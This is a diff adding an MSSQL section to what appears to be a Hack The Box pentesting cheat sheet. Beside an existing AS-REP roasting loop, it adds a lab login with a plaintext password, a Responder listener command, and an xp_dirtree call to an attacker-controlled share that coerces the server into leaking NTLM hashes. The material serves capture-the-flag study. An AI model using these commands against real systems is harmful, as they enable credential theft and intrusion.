@@ -36,6 +36,13 @@ Example:
 ```
 for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
 ```
+## MSSQL
+```
+mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
+https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#database-access
+Responser: responser -I tun0
+RCE: EXEC xp_dirtree '\\10.10.14.6\share', 1, 1
+```
 
 ## SMB Enum
 ```
